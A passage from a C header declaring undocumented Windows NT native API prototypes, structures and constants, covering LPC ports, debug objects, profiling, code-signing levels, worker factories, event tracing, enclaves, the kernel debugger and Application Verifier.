    _In_ ULONG DataEntryIndex,
    _Out_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _Out_opt_ PULONG NumberOfBytesRead);

NTSYSAPI
NTSTATUS
NTAPI
NtConnectPort(
    _Out_ PHANDLE PortHandle,
    _In_ PUNICODE_STRING PortName,
    _In_ PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    _Inout_opt_ PPORT_VIEW ClientView,
    _Out_opt_ PREMOTE_PORT_VIEW ServerView,
    _Out_opt_ PULONG MaxMessageLength,
    _Inout_opt_	PVOID ConnectionInformation,
    _Inout_opt_	PULONG ConnectionInformationLength);

NTSYSAPI
NTSTATUS
NTAPI
NtAcceptConnectPort(
    _Out_ PHANDLE PortHandle,
    _In_opt_ PVOID PortContext,
    _In_ PPORT_MESSAGE ConnectionRequest,
    _In_ BOOLEAN AcceptConnection,
    _Inout_opt_ PPORT_VIEW ServerView,
    _Out_opt_ PREMOTE_PORT_VIEW ClientView);

NTSYSAPI
NTSTATUS
NTAPI
NtSecureConnectPort(
    _Out_ PHANDLE PortHandle,
    _In_ PUNICODE_STRING PortName,
    _In_ PSECURITY_QUALITY_OF_SERVICE SecurityQos,
    _Inout_opt_ PPORT_VIEW ClientView,
    _In_opt_ PSID RequiredServerSid,
    _Inout_opt_ PREMOTE_PORT_VIEW ServerView,
    _Out_opt_ PULONG MaxMessageLength,
    _Inout_opt_ PVOID ConnectionInformation,
    _Inout_opt_ PULONG ConnectionInformationLength);

/************************************************************************************
*
* Boot Management API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtEnumerateBootEntries(
    _Out_writes_bytes_opt_(*BufferLength) PVOID Buffer,
    _Inout_ PULONG BufferLength);

/************************************************************************************
*
* Reserve Objects API.
*
************************************************************************************/

typedef enum _MEMORY_RESERVE_TYPE {
    MemoryReserveUserApc,
    MemoryReserveIoCompletion,
    MemoryReserveTypeMax
} MEMORY_RESERVE_TYPE;

NTSYSAPI
NTSTATUS
NTAPI
NtAllocateReserveObject(
    _Out_ PHANDLE MemoryReserveHandle,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ MEMORY_RESERVE_TYPE Type);

/************************************************************************************
*
* Debug API.
*
************************************************************************************/

//
// Define the debug object thats used to attatch to processes that are being debugged.
//
#define DEBUG_OBJECT_DELETE_PENDING (0x1) // Debug object is delete pending.
#define DEBUG_OBJECT_KILL_ON_CLOSE  (0x2) // Kill all debugged processes on close

typedef struct _DEBUG_OBJECT {
    //
    // Event thats set when the EventList is populated.
    //
    KEVENT EventsPresent;
    //
    // Mutex to protect the structure
    //
    FAST_MUTEX Mutex;
    //
    // Queue of events waiting for debugger intervention
    //
    LIST_ENTRY EventList;
    //
    // Flags for the object
    //
    ULONG Flags;
} DEBUG_OBJECT, *PDEBUG_OBJECT;

typedef enum _DEBUGOBJECTINFOCLASS {
    DebugObjectUnusedInformation,
    DebugObjectKillProcessOnExitInformation,
    MaxDebugObjectInfoClass
} DEBUGOBJECTINFOCLASS, * PDEBUGOBJECTINFOCLASS;

typedef struct _DBGKM_EXCEPTION {
    EXCEPTION_RECORD ExceptionRecord;
    ULONG FirstChance;
} DBGKM_EXCEPTION, * PDBGKM_EXCEPTION;

typedef struct _DBGKM_CREATE_THREAD {
    ULONG SubSystemKey;
    PVOID StartAddress;
} DBGKM_CREATE_THREAD, * PDBGKM_CREATE_THREAD;

typedef struct _DBGKM_CREATE_PROCESS {
    ULONG SubSystemKey;
    HANDLE FileHandle;
    PVOID BaseOfImage;
    ULONG DebugInfoFileOffset;
    ULONG DebugInfoSize;
    DBGKM_CREATE_THREAD InitialThread;
} DBGKM_CREATE_PROCESS, * PDBGKM_CREATE_PROCESS;

typedef struct _DBGKM_EXIT_THREAD {
    NTSTATUS ExitStatus;
} DBGKM_EXIT_THREAD, * PDBGKM_EXIT_THREAD;

typedef struct _DBGKM_EXIT_PROCESS {
    NTSTATUS ExitStatus;
} DBGKM_EXIT_PROCESS, * PDBGKM_EXIT_PROCESS;

typedef struct _DBGKM_LOAD_DLL {
    HANDLE FileHandle;
    PVOID BaseOfDll;
    ULONG DebugInfoFileOffset;
    ULONG DebugInfoSize;
    PVOID NamePointer;
} DBGKM_LOAD_DLL, * PDBGKM_LOAD_DLL;

typedef struct _DBGKM_UNLOAD_DLL {
    PVOID BaseAddress;
} DBGKM_UNLOAD_DLL, * PDBGKM_UNLOAD_DLL;

typedef enum _DBG_STATE {
    DbgIdle,
    DbgReplyPending,
    DbgCreateThreadStateChange,
    DbgCreateProcessStateChange,
    DbgExitThreadStateChange,
    DbgExitProcessStateChange,
    DbgExceptionStateChange,
    DbgBreakpointStateChange,
    DbgSingleStepStateChange,
    DbgLoadDllStateChange,
    DbgUnloadDllStateChange
} DBG_STATE, * PDBG_STATE;

typedef struct _DBGUI_CREATE_THREAD {
    HANDLE HandleToThread;
    DBGKM_CREATE_THREAD NewThread;
} DBGUI_CREATE_THREAD, * PDBGUI_CREATE_THREAD;

typedef struct _DBGUI_CREATE_PROCESS {
    HANDLE HandleToProcess;
    HANDLE HandleToThread;
    DBGKM_CREATE_PROCESS NewProcess;
} DBGUI_CREATE_PROCESS, * PDBGUI_CREATE_PROCESS;

typedef struct _DBGUI_WAIT_STATE_CHANGE {
    DBG_STATE NewState;
    CLIENT_ID AppClientId;
    union
    {
        DBGKM_EXCEPTION Exception;
        DBGUI_CREATE_THREAD CreateThread;
        DBGUI_CREATE_PROCESS CreateProcessInfo;
        DBGKM_EXIT_THREAD ExitThread;
        DBGKM_EXIT_PROCESS ExitProcess;
        DBGKM_LOAD_DLL LoadDll;
        DBGKM_UNLOAD_DLL UnloadDll;
    } StateInfo;
} DBGUI_WAIT_STATE_CHANGE, * PDBGUI_WAIT_STATE_CHANGE;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateDebugObject(
    _Out_ PHANDLE DebugObjectHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ ULONG Flags);

NTSYSAPI
NTSTATUS
NTAPI
NtSetInformationDebugObject(
    _In_ HANDLE DebugObjectHandle,
    _In_ DEBUGOBJECTINFOCLASS DebugObjectInformationClass,
    _In_reads_bytes_(DebugInformationLength) PVOID DebugInformation,
    _In_ ULONG DebugInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtDebugActiveProcess(
    _In_ HANDLE ProcessHandle,
    _In_ HANDLE DebugObjectHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtDebugContinue(
    _In_ HANDLE DebugObjectHandle,
    _In_ PCLIENT_ID ClientId,
    _In_ NTSTATUS ContinueStatus);

NTSYSAPI
NTSTATUS
NTAPI
NtWaitForDebugEvent(
    _In_ HANDLE DebugObjectHandle,
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER Timeout,
    _Out_ PDBGUI_WAIT_STATE_CHANGE WaitStateChange
);

NTSYSAPI
NTSTATUS
NTAPI
NtRemoveProcessDebug(
    _In_ HANDLE ProcessHandle,
    _In_ HANDLE DebugObjectHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryDebugFilterState(
    _In_ ULONG ComponentId,
    _In_ ULONG Level);

NTSYSAPI
NTSTATUS
NTAPI
NtSetDebugFilterState(
    _In_ ULONG ComponentId,
    _In_ ULONG Level,
    _In_ BOOLEAN State);


/************************************************************************************
*
* Profile API.
*
************************************************************************************/

typedef enum _KPROFILE_SOURCE {
    ProfileTime,
    ProfileAlignmentFixup,
    ProfileTotalIssues,
    ProfilePipelineDry,
    ProfileLoadInstructions,
    ProfilePipelineFrozen,
    ProfileBranchInstructions,
    ProfileTotalNonissues,
    ProfileDcacheMisses,
    ProfileIcacheMisses,
    ProfileCacheMisses,
    ProfileBranchMispredictions,
    ProfileStoreInstructions,
    ProfileFpInstructions,
    ProfileIntegerInstructions,
    Profile2Issue,
    Profile3Issue,
    Profile4Issue,
    ProfileSpecialInstructions,
    ProfileTotalCycles,
    ProfileIcacheIssues,
    ProfileDcacheAccesses,
    ProfileMemoryBarrierCycles,
    ProfileLoadLinkedIssues,
    ProfileMaximum
} KPROFILE_SOURCE;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateProfile(
    _Out_ PHANDLE ProfileHandle,
    _In_opt_ HANDLE Process,
    _In_ PVOID ProfileBase,
    _In_ SIZE_T ProfileSize,
    _In_ ULONG BucketSize,
    _In_reads_bytes_(BufferSize) PULONG Buffer,
    _In_ ULONG BufferSize,
    _In_ KPROFILE_SOURCE ProfileSource,
    _In_ KAFFINITY Affinity);

NTSYSAPI
NTSTATUS
NTAPI
NtStartProfile(
    _In_ HANDLE ProfileHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtStopProfile(
    _In_ HANDLE ProfileHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryIntervalProfile(
    _In_ KPROFILE_SOURCE ProfileSource,
    _Out_ PULONG Interval);

NTSYSAPI
NTSTATUS
NTAPI
NtSetIntervalProfile(
    _In_ ULONG Interval,
    _In_ KPROFILE_SOURCE Source);

/************************************************************************************
*
* Signing Levels API.
*
************************************************************************************/
typedef UCHAR SE_SIGNING_LEVEL, *PSE_SIGNING_LEVEL;

typedef struct _SE_FILE_CACHE_CLAIM_INFORMATION {
    ULONG Size;
    PVOID Claim;
} SE_FILE_CACHE_CLAIM_INFORMATION, *PSE_FILE_CACHE_CLAIM_INFORMATION;

typedef struct _SE_SET_FILE_CACHE_INFORMATION {
    ULONG Size;
    UNICODE_STRING CatalogDirectoryPath;
    SE_FILE_CACHE_CLAIM_INFORMATION OriginClaimInfo;
} SE_SET_FILE_CACHE_INFORMATION, *PSE_SET_FILE_CACHE_INFORMATION;

#ifndef SE_SIGNING_LEVEL_UNCHECKED
#define SE_SIGNING_LEVEL_UNCHECKED         0x00000000
#endif

#ifndef SE_SIGNING_LEVEL_UNSIGNED
#define SE_SIGNING_LEVEL_UNSIGNED          0x00000001
#endif

#ifndef SE_SIGNING_LEVEL_ENTERPRISE
#define SE_SIGNING_LEVEL_ENTERPRISE        0x00000002
#endif

#ifndef SE_SIGNING_LEVEL_CUSTOM_1
#define SE_SIGNING_LEVEL_CUSTOM_1          0x00000003
#endif

#ifndef SE_SIGNING_LEVEL_DEVELOPER
#define SE_SIGNING_LEVEL_DEVELOPER         SE_SIGNING_LEVEL_CUSTOM_1
#endif

#ifndef SE_SIGNING_LEVEL_AUTHENTICODE
#define SE_SIGNING_LEVEL_AUTHENTICODE      0x00000004
#endif

#ifndef SE_SIGNING_LEVEL_CUSTOM_2
#define SE_SIGNING_LEVEL_CUSTOM_2          0x00000005
#endif

#ifndef SE_SIGNING_LEVEL_STORE
#define SE_SIGNING_LEVEL_STORE             0x00000006
#endif

#ifndef SE_SIGNING_LEVEL_CUSTOM_3
#define SE_SIGNING_LEVEL_CUSTOM_3          0x00000007
#endif

#ifndef SE_SIGNING_LEVEL_ANTIMALWARE
#define SE_SIGNING_LEVEL_ANTIMALWARE       SE_SIGNING_LEVEL_CUSTOM_3
#endif

#ifndef SE_SIGNING_LEVEL_MICROSOFT
#define SE_SIGNING_LEVEL_MICROSOFT         0x00000008
#endif

#ifndef SE_SIGNING_LEVEL_CUSTOM_4
#define SE_SIGNING_LEVEL_CUSTOM_4          0x00000009
#endif

#ifndef SE_SIGNING_LEVEL_CUSTOM_5
#define SE_SIGNING_LEVEL_CUSTOM_5          0x0000000A
#endif

#ifndef SE_SIGNING_LEVEL_DYNAMIC_CODEGEN
#define SE_SIGNING_LEVEL_DYNAMIC_CODEGEN   0x0000000B
#endif

#ifndef SE_SIGNING_LEVEL_WINDOWS
#define SE_SIGNING_LEVEL_WINDOWS           0x0000000C
#endif

#ifndef SE_SIGNING_LEVEL_CUSTOM_7
#define SE_SIGNING_LEVEL_CUSTOM_7          0x0000000D
#endif

#ifndef SE_SIGNING_LEVEL_WINDOWS_TCB
#define SE_SIGNING_LEVEL_WINDOWS_TCB       0x0000000E
#endif

#ifndef SE_SIGNING_LEVEL_CUSTOM_6
#define SE_SIGNING_LEVEL_CUSTOM_6          0x0000000F
#endif

NTSYSAPI
NTSTATUS
NTAPI
NtSetCachedSigningLevel(
    _In_ ULONG Flags,
    _In_ SE_SIGNING_LEVEL InputSigningLevel,
    _In_reads_(SourceFileCount) PHANDLE SourceFiles,
    _In_ ULONG SourceFileCount,
    _In_opt_ HANDLE TargetFile);

NTSYSAPI
NTSTATUS
NTAPI
NtSetCachedSigningLevel2(
    _In_ ULONG Flags,
    _In_ SE_SIGNING_LEVEL InputSigningLevel,
    _In_reads_(SourceFileCount) PHANDLE SourceFiles,
    _In_ ULONG SourceFileCount,
    _In_opt_ HANDLE TargetFile,
    _In_opt_ SE_SET_FILE_CACHE_INFORMATION* CacheInformation);

NTSYSAPI
NTSTATUS
NTAPI
NtGetCachedSigningLevel(
    _In_ HANDLE File,
    _Out_ PULONG Flags,
    _Out_ PSE_SIGNING_LEVEL SigningLevel,
    _Out_writes_bytes_to_opt_(*ThumbprintSize, *ThumbprintSize) PUCHAR Thumbprint,
    _Inout_opt_ PULONG ThumbprintSize,
    _Out_opt_ PULONG ThumbprintAlgorithm);

//REDSTONE 2 and above
NTSYSAPI
NTSTATUS
NTAPI
NtCompareSigningLevels(
    _In_ SE_SIGNING_LEVEL FirstSigningLevel,
    _In_ SE_SIGNING_LEVEL SecondSigningLevel);

/************************************************************************************
*
* Worker Factory API.
*
************************************************************************************/

typedef enum _WORKERFACTORYINFOCLASS {
    WorkerFactoryTimeout,
    WorkerFactoryRetryTimeout,
    WorkerFactoryIdleTimeout,
    WorkerFactoryBindingCount,
    WorkerFactoryThreadMinimum,
    WorkerFactoryThreadMaximum,
    WorkerFactoryPaused,
    WorkerFactoryBasicInformation,
    WorkerFactoryAdjustThreadGoal,
    WorkerFactoryCallbackType,
    WorkerFactoryStackInformation,
    WorkerFactoryThreadBasePriority,
    WorkerFactoryTimeoutWaiters,
    WorkerFactoryFlags,
    WorkerFactoryThreadSoftMaximum,
    MaxWorkerFactoryInfoClass
} WORKERFACTORYINFOCLASS, *PWORKERFACTORYINFOCLASS;

typedef struct _WORKER_FACTORY_BASIC_INFORMATION {
    LARGE_INTEGER Timeout;
    LARGE_INTEGER RetryTimeout;
    LARGE_INTEGER IdleTimeout;
    BOOLEAN Paused;
    BOOLEAN TimerSet;
    BOOLEAN QueuedToExWorker;
    BOOLEAN MayCreate;
    BOOLEAN CreateInProgress;
    BOOLEAN InsertedIntoQueue;
    BOOLEAN Shutdown;
    ULONG BindingCount;
    ULONG ThreadMinimum;
    ULONG ThreadMaximum;
    ULONG PendingWorkerCount;
    ULONG WaitingWorkerCount;
    ULONG TotalWorkerCount;
    ULONG ReleaseCount;
    LONGLONG InfiniteWaitGoal;
    PVOID StartRoutine;
    PVOID StartParameter;
    HANDLE ProcessId;
    SIZE_T StackReserve;
    SIZE_T StackCommit;
    NTSTATUS LastThreadCreationStatus;
} WORKER_FACTORY_BASIC_INFORMATION, *PWORKER_FACTORY_BASIC_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI
NtCreateWorkerFactory(
    _Out_ PHANDLE WorkerFactoryHandleReturn,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ HANDLE CompletionPortHandle,
    _In_ HANDLE WorkerProcessHandle,
    _In_ PVOID StartRoutine,
    _In_opt_ PVOID StartParameter,
    _In_opt_ ULONG MaxThreadCount,
    _In_opt_ SIZE_T StackReserve,
    _In_opt_ SIZE_T StackCommit);

NTSYSAPI
NTSTATUS
NTAPI
NtQueryInformationWorkerFactory(
    _In_ HANDLE WorkerFactoryHandle,
    _In_ WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
    _Out_writes_bytes_(WorkerFactoryInformationLength) PVOID WorkerFactoryInformation,
    _In_ ULONG WorkerFactoryInformationLength,
    _Out_opt_ PULONG ReturnLength);

NTSYSAPI
NTSTATUS
NTAPI
NtShutdownWorkerFactory(
    _In_ HANDLE WorkerFactoryHandle,
    _Inout_ volatile LONG *PendingWorkerCount);

NTSYSAPI
NTSTATUS
NTAPI
NtReleaseWorkerFactoryWorker(
    _In_ HANDLE WorkerFactoryHandle);

/************************************************************************************
*
* Event Tracing API.
*
************************************************************************************/

typedef enum _TRACE_CONTROL_INFORMATION_CLASS {
    TraceControlStartLogger = 1,
    TraceControlStopLogger = 2,
    TraceControlQueryLogger = 3,
    TraceControlUpdateLogger = 4,
    TraceControlFlushLogger = 5,
    TraceControlIncrementLoggerFile = 6,
    TraceControlInvalidClass1 = 7,
    TraceControlInvalidCalss2 = 8,
    TraceControlInvalidClass3 = 9,
    TraceControlInvalidClass4 = 10,
    TraceControlRealtimeConnect = 11,
    TraceControlWdiDispatchControl = 13,
    TraceControlRealtimeDisconnectConsumerByHandle = 14,
    TraceControlReceiveNotification = 16,
    TraceControlEnableGuid = 17,
    TraceControlSendReplyDataBlock = 18,
    TraceControlReceiveReplyDataBlock = 19,
    TraceControlWdiUpdateSem = 20,
    TraceControlGetTraceGuidList = 21,
    TraceControlGetTraceGuidInfo = 22,
    TraceControlEnumerateTraceGuids = 23,
    TraceControlInvalidClass5 = 24,
    TraceControlQueryReferenceTime = 25,
    TraceControlTrackProviderBinary = 26,
    TraceControlAddNotificationEvent = 27,
    TraceControlUpdateDisallowList = 28,
    TraceControlInvalidClass6 = 29,
    TraceControlInvalidClass7 = 30,
    TraceControlUseDescriptorTypeUm = 31,
    TraceControlGetTraceGroupList = 32,
    TraceControlGetTraceGroupInfo = 33,
    TraceControlTraceSetDisallowList = 34,
    TraceControlSetCompressionSettings = 35,
    TraceControlGetCompressionSettings = 36,
    TraceControlUpdatePeriodicCaptureState = 37,
    TraceControlGetPrivateSessionTraceHandle = 38,
    TraceControlRegisterPrivateSession = 39,
    TraceControlQuerySessionDemuxObject = 40,
    TraceControlSetProviderBinaryTracking = 41,
    TraceControlMaxLoggers = 42,
    TraceControlMaxPmcCounter = 43
} TRACE_CONTROL_INFORMATION_CLASS;

NTSYSAPI
NTSTATUS
NTAPI
NtTraceEvent(
    _In_ HANDLE TraceHandle,
    _In_ ULONG Flags,
    _In_ ULONG FieldSize,
    _In_ PVOID Fields);

NTSYSAPI
NTSTATUS
NTAPI
NtTraceControl(
    _In_ TRACE_CONTROL_INFORMATION_CLASS TraceInformationClass,
    _In_reads_bytes_opt_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(TraceInformationLength) PVOID TraceInformation,
    _In_ ULONG TraceInformationLength,
    _Out_ PULONG ReturnLength);

/************************************************************************************
*
* Enclave API.
*
************************************************************************************/

#ifndef _WIN32_WINNT_WIN10
#define _WIN32_WINNT_WIN10 0x0A00
#endif
#if (_WIN32_WINNT < _WIN32_WINNT_WIN10)
typedef LPVOID(WINAPI* PENCLAVE_ROUTINE) (LPVOID lpThreadParameter);
typedef PENCLAVE_ROUTINE LPENCLAVE_ROUTINE;
#endif

NTSYSAPI
NTSTATUS
NTAPI
NtCreateEnclave(
    _In_ HANDLE ProcessHandle,
    _Inout_ PVOID* BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _In_ SIZE_T Size,
    _In_ SIZE_T InitialCommitment,
    _In_ ULONG EnclaveType,
    _In_reads_bytes_(EnclaveInformationLength) PVOID EnclaveInformation,
    _In_ ULONG EnclaveInformationLength,
    _Out_opt_ PULONG EnclaveError);

NTSYSAPI
NTSTATUS
NTAPI
NtLoadEnclaveData(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID BaseAddress,
    _In_reads_bytes_(BufferSize) PVOID Buffer,
    _In_ SIZE_T BufferSize,
    _In_ ULONG Protect,
    _In_reads_bytes_(PageInformationLength) PVOID PageInformation,
    _In_ ULONG PageInformationLength,
    _Out_opt_ PSIZE_T NumberOfBytesWritten,
    _Out_opt_ PULONG EnclaveError);

NTSYSAPI
NTSTATUS
NTAPI
NtInitializeEnclave(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID BaseAddress,
    _In_reads_bytes_(EnclaveInformationLength) PVOID EnclaveInformation,
    _In_ ULONG EnclaveInformationLength,
    _Out_opt_ PULONG EnclaveError);

NTSYSAPI
NTSTATUS
NTAPI
NtTerminateEnclave(
    _In_ PVOID BaseAddress,
    _In_ BOOLEAN WaitForThread);

NTSYSAPI
NTSTATUS
NTAPI
NtCallEnclave(
    _In_ PENCLAVE_ROUTINE Routine,
    _In_ PVOID Parameter,
    _In_ BOOLEAN WaitForThread,
    _Out_opt_ PVOID* ReturnValue);


/************************************************************************************
*
* LUID/UUID API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtSetUuidSeed(
    _In_ PCHAR Seed);

NTSYSAPI
NTSTATUS
NTAPI
NtAllocateUuids(
    _Out_ PULARGE_INTEGER Time,
    _Out_ PULONG Range,
    _Out_ PULONG Sequence,
    _Out_ PCHAR Seed);

NTSYSAPI
NTSTATUS
NTAPI
NtAllocateLocallyUniqueId(
    _Out_ PLUID Luid);


/************************************************************************************
*
* Kernel Debugger API.
*
************************************************************************************/

typedef struct _SYSTEM_KERNEL_DEBUGGER_INFORMATION {
    BOOLEAN KernelDebuggerEnabled;
    BOOLEAN KernelDebuggerNotPresent;
} SYSTEM_KERNEL_DEBUGGER_INFORMATION, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION;

typedef struct _SYSTEM_KERNEL_DEBUGGER_INFORMATION_EX {
    BOOLEAN DebuggerAllowed;
    BOOLEAN DebuggerEnabled;
    BOOLEAN DebuggerPresent;
} SYSTEM_KERNEL_DEBUGGER_INFORMATION_EX, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION_EX;

typedef enum _SYSDBG_COMMAND {
    SysDbgQueryModuleInformation,
    SysDbgQueryTraceInformation,
    SysDbgSetTracepoint,
    SysDbgSetSpecialCall,
    SysDbgClearSpecialCalls,
    SysDbgQuerySpecialCalls,
    SysDbgBreakPoint,
    SysDbgQueryVersion,
    SysDbgReadVirtual,
    SysDbgWriteVirtual,
    SysDbgReadPhysical,
    SysDbgWritePhysical,
    SysDbgReadControlSpace,
    SysDbgWriteControlSpace,
    SysDbgReadIoSpace,
    SysDbgWriteIoSpace,
    SysDbgReadMsr,
    SysDbgWriteMsr,
    SysDbgReadBusData,
    SysDbgWriteBusData,
    SysDbgCheckLowMemory,
    SysDbgEnableKernelDebugger,
    SysDbgDisableKernelDebugger,
    SysDbgGetAutoKdEnable,
    SysDbgSetAutoKdEnable,
    SysDbgGetPrintBufferSize,
    SysDbgSetPrintBufferSize,
    SysDbgGetKdUmExceptionEnable,
    SysDbgSetKdUmExceptionEnable,
    SysDbgGetTriageDump,
    SysDbgGetKdBlockEnable,
    SysDbgSetKdBlockEnable,
    SysDbgRegisterForUmBreakInfo,
    SysDbgGetUmBreakPid,
    SysDbgClearUmBreakPid,
    SysDbgGetUmAttachPid,
    SysDbgClearUmAttachPid,
    SysDbgGetLiveKernelDump,
    SysDbgKdPullRemoteFile,
    SysDbgMaxInfoClass
} SYSDBG_COMMAND, *PSYSDBG_COMMAND;

typedef struct _SYSDBG_VIRTUAL {
    PVOID Address;
    PVOID Buffer;
    ULONG Request;
} SYSDBG_VIRTUAL, *PSYSDBG_VIRTUAL;

NTSYSAPI
NTSTATUS
NTAPI
NtSystemDebugControl(
    _In_ SYSDBG_COMMAND Command,
    _Inout_updates_bytes_opt_(InputBufferLength) PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _Out_writes_bytes_opt_(OutputBufferLength) PVOID OutputBuffer,
    _In_ ULONG OutputBufferLength,
    _Out_opt_ PULONG ReturnLength);

/************************************************************************************
*
* HardError API.
*
************************************************************************************/

#ifndef HARDERROR_OVERRIDE_ERRORMODE
#define HARDERROR_OVERRIDE_ERRORMODE 0x10000000
#endif

typedef enum _HARDERROR_RESPONSE_OPTION {
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem,
    OptionOkNoWait,
    OptionCancelTryContinue
} HARDERROR_RESPONSE_OPTION;

typedef enum _HARDERROR_RESPONSE {
    ResponseReturnToCaller,
    ResponseNotHandled,
    ResponseAbort,
    ResponseCancel,
    ResponseIgnore,
    ResponseNo,
    ResponseOk,
    ResponseRetry,
    ResponseYes,
    ResponseTryAgain,
    ResponseContinue
} HARDERROR_RESPONSE;

NTSYSCALLAPI
NTSTATUS
NTAPI
NtRaiseHardError(
    _In_ NTSTATUS ErrorStatus,
    _In_ ULONG NumberOfParameters,
    _In_ ULONG UnicodeStringParameterMask,
    _In_reads_(NumberOfParameters) PULONG_PTR Parameters,
    _In_ ULONG ValidResponseOptions,
    _Out_ PULONG Response);

/************************************************************************************
*
* IoRing API.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
NtCreateIoRing(
    _Out_ PHANDLE IoRingHandle,
    _In_ ULONG CreateParametersLength,
    _In_ PVOID CreateParameters,
    _In_ ULONG OutputParametersLength,
    _Out_ PVOID OutputParameters);

/************************************************************************************
*
* Thread Pooling API and definitions.
*
************************************************************************************/

NTSYSAPI
NTSTATUS
NTAPI
TpAllocPool(
    _Out_ PTP_POOL* PoolReturn,
    _Reserved_ PVOID Reserved);

NTSYSAPI
VOID
NTAPI
TpReleasePool(
    _Inout_ PTP_POOL Pool);

NTSYSAPI
NTSTATUS
NTAPI
TpAllocWork(
    _Out_ PTP_WORK* WorkReturn,
    _In_ PTP_WORK_CALLBACK Callback,
    _Inout_opt_ PVOID Context,
    _In_opt_ PTP_CALLBACK_ENVIRON CallbackEnviron);

NTSYSAPI
VOID
NTAPI
TpReleaseWork(
    _Inout_ PTP_WORK Work);

NTSYSAPI
VOID
NTAPI
TpPostWork(
    _Inout_ PTP_WORK Work);

NTSYSAPI
VOID
NTAPI
TpWaitForWork(
    _Inout_ PTP_WORK Work,
    _In_ LOGICAL CancelPendingCallbacks);

/************************************************************************************
*
* ApiSet definitions.
*
************************************************************************************/

NTSYSAPI
BOOL
NTAPI
ApiSetQueryApiSetPresence(
    _In_ PCUNICODE_STRING Namespace,
    _Out_ PBOOLEAN Present);

NTSYSAPI
BOOL
NTAPI
ApiSetQueryApiSetPresenceEx(
    _In_ PCUNICODE_STRING Namespace,
    _Out_ PBOOLEAN IsInSchema,
    _Out_ PBOOLEAN Present);

/************************************************************************************
*
* Application Verifier API and definitions.
*
************************************************************************************/

#ifndef DLL_PROCESS_VERIFIER
#define DLL_PROCESS_VERIFIER 4
#endif

typedef VOID(NTAPI *RTL_VERIFIER_DLL_LOAD_CALLBACK)(
    PWSTR DllName,
    PVOID DllBase,
    SIZE_T DllSize,
    PVOID Reserved);

typedef VOID(NTAPI *RTL_VERIFIER_DLL_UNLOAD_CALLBACK)(
    PWSTR DllName,
    PVOID DllBase,
    SIZE_T DllSize,
    PVOID Reserved);

typedef VOID(NTAPI *RTL_VERIFIER_NTDLLHEAPFREE_CALLBACK)(
    PVOID AllocationBase,
    SIZE_T AllocationSize);

typedef struct _RTL_VERIFIER_THUNK_DESCRIPTOR {
    PCHAR ThunkName;
    PVOID ThunkOldAddress;
    PVOID ThunkNewAddress;
} RTL_VERIFIER_THUNK_DESCRIPTOR, *PRTL_VERIFIER_THUNK_DESCRIPTOR;

typedef struct _RTL_VERIFIER_DLL_DESCRIPTOR {
    PWCHAR DllName;
    DWORD DllFlags;
    PVOID DllAddress;
    PRTL_VERIFIER_THUNK_DESCRIPTOR DllThunks;
} RTL_VERIFIER_DLL_DESCRIPTOR, *PRTL_VERIFIER_DLL_DESCRIPTOR;

typedef struct _RTL_VERIFIER_PROVIDER_DESCRIPTOR {
    DWORD Length;
    PRTL_VERIFIER_DLL_DESCRIPTOR ProviderDlls;
    RTL_VERIFIER_DLL_LOAD_CALLBACK ProviderDllLoadCallback;
    RTL_VERIFIER_DLL_UNLOAD_CALLBACK ProviderDllUnloadCallback;
    PWSTR VerifierImage;
    DWORD VerifierFlags;
    DWORD VerifierDebug;
    PVOID RtlpGetStackTraceAddress;
    PVOID RtlpDebugPageHeapCreate;
    PVOID RtlpDebugPageHeapDestroy;
    RTL_VERIFIER_NTDLLHEAPFREE_CALLBACK ProviderNtdllHeapFreeCallback;
} RTL_VERIFIER_PROVIDER_DESCRIPTOR, *PRTL_VERIFIER_PROVIDER_DESCRIPTOR;

//
// Application verifier standard flags.
//
#define RTL_VRF_FLG_FULL_PAGE_HEAP                   0x00000001
#define RTL_VRF_FLG_RESERVED_DONOTUSE                0x00000002
#define RTL_VRF_FLG_HANDLE_CHECKS                    0x00000004
#define RTL_VRF_FLG_STACK_CHECKS                     0x00000008
#define RTL_VRF_FLG_APPCOMPAT_CHECKS                 0x00000010
#define RTL_VRF_FLG_TLS_CHECKS                       0x00000020
#define RTL_VRF_FLG_DIRTY_STACKS                     0x00000040
#define RTL_VRF_FLG_RPC_CHECKS                       0x00000080
#define RTL_VRF_FLG_COM_CHECKS                       0x00000100
#define RTL_VRF_FLG_DANGEROUS_APIS                   0x00000200
#define RTL_VRF_FLG_RACE_CHECKS                      0x00000400
#define RTL_VRF_FLG_DEADLOCK_CHECKS                  0x00000800
#define RTL_VRF_FLG_FIRST_CHANCE_EXCEPTION_CHECKS    0x00001000
#define RTL_VRF_FLG_VIRTUAL_MEM_CHECKS               0x00002000
#define RTL_VRF_FLG_ENABLE_LOGGING                   0x00004000
#define RTL_VRF_FLG_FAST_FILL_HEAP                   0x00008000
#define RTL_VRF_FLG_VIRTUAL_SPACE_TRACKING           0x00010000
#define RTL_VRF_FLG_ENABLED_SYSTEM_WIDE              0x00020000
